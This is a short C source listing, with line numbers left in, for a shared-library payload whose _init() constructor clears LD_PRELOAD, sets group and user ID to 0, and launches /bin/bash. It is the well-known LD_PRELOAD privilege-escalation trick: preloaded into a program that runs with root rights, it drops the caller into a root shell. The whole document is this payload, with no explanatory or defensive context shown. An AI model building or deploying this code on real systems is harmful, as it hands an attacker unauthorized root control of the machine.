#include <stdio.h>
 2 #include <unistd.h>
 3 #include <sys/types.h>
 4 #include <stdlib.h>
 5
 6 void _init() {
 7         unsetenv("LD_PRELOAD");
 8         setgid(0);
 9         setuid(0);
10         system("/bin/bash");
11 }
12
